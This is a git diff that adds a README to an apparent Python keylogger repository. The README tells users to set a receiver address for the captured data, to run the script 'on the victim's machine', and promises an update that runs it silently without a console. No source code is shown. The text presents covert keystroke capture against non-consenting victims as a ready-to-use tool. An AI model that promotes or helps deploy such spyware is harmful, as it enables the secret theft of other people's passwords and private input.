@@ -1,2 +1,19 @@
 # keyloggerPython
-keylogger using Python
+This is a keylogger made using python3.
+
+You can just remove the receiver address and then get started using this small but powerfull keylogger file.
+
+The sencer address is by your wish, you can leave as it is or change it on your own.
+
+just run on the victim's machine as,
+
+python3 keylogger.py
+
+
+Coming updates:
+ > Run this keylogger silently or without the running console. {You can also prefer to google this as many tools help you run your python file without console}
+ > ....
+
+{
+	Stay #Tuned
+}
